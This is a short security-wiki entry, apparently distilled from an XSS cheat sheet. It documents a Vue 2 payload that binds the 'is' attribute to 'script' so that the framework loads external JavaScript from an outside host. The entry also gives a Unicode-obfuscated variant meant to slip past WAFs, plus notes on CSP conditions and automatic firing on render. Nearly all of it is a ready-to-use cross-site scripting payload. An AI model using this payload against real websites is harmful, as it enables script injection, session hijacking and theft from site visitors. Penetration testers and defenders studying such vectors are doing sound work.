---
title: Vue 2 v-bind:is Script Tag Injection
slug: vue2-vbind-is-script
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/csti, sink/vue2, sink/script-injection]
inbound: []
---

# Vue 2 v-bind:is Script Tag Injection

## Payload

```html
<x v-bind:is="'script'" src="//14.rs" />
```

## Variants

```html
<x is=script src=//⑭.₨>
```

## Context

Vue 2 resolves the `is` attribute (used for dynamic components) as a tag name. Binding `is` to `'script'` causes Vue to render the element as a `<script>` tag, loading an external JavaScript file. The unicode variant uses Unicode digit/currency symbols that some WAFs do not match as a domain pattern. Bypasses CSP only if the attacker's domain is in `script-src`; useful when `new Function` / `eval` are blocked by CSP but external scripts are allowed. No user interaction needed — fires on component render.

## Provenance

- Distilled from: `../../techniques/dom-xss/framework-vectors-vue.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Vue.js Framework Vectors](../../techniques/dom-xss/framework-vectors-vue.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
